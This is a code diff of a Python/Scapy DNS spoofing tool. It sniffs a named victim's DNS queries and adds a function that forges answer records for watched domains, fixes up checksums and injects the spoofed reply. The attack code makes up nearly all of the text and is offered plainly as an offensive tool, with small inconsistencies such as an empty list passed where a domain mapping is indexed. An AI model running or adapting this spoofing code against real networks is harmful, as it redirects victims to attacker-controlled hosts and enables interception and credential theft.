@@ -8,23 +8,37 @@ def dns_spoofing(victim_ip, server_ip, mode):
     try:
         # Sniff for DNS packet
         pkt = sc.sniff(
-        filter="ip",
-        iface=iface,
-        store=1,
-        stop_filter=lambda p: (
-            p.haslayer(sc.IP)
-            and p.haslayer(sc.UDP)
-            and p[sc.UDP].dport == 53
-            and p[sc.IP].src == victim_ip
-        )
+            filter="ip",
+            iface=iface,
+            store=1,
+            stop_filter=lambda p: (
+                p.haslayer(sc.IP)
+                and p.haslayer(sc.UDP)
+                and p[sc.UDP].dport == 53
+                and p[sc.IP].src == victim_ip
+        ))[0]
 
         handle_dns_query(pkt, victim_ip, [])
-    )[0]
 
     except Exception as e:
         print(f"[!] Error during ARP poisoning: {e}")
         return None, None
     
+
+def modify_packet(packet, watched_domains):
+    qname = packet[sc.DNSQR].qname
+    if qname not in watched_domains:
+        print("Invalid DNS Host:", qname)
+        return packet
+    packet[sc.DNS].an = sc.DNSRR(rrname=qname, rdata=watched_domains[qname])
+    packet[sc.DNS].ancount = 1
+
+    del packet[sc.IP].len
+    del packet[sc.IP].chksum
+    del packet[sc.UDP].len
+    del packet[sc.UDP].chksum
+
+    return packet
 
 def handle_dns_query(pkt, victim_ip, watched_domains):
     # Ensure it's a DNS packet
@@ -49,5 +63,9 @@ def handle_dns_query(pkt, victim_ip, watched_domains):
         for domain in watched_domains:
             if domain.encode() in query_domain.lower().encode():
                 print(f"[!] Domain MATCH: Victim requested {query_domain}")
+                modified_packet = modify_packet(pkt, watched_domains)
+                pkt.set_payload(bytes(modified_packet))
+                pkt.accept()
+                return
             else:
                 print(f"[ ] No match for watched domain: {domain}")
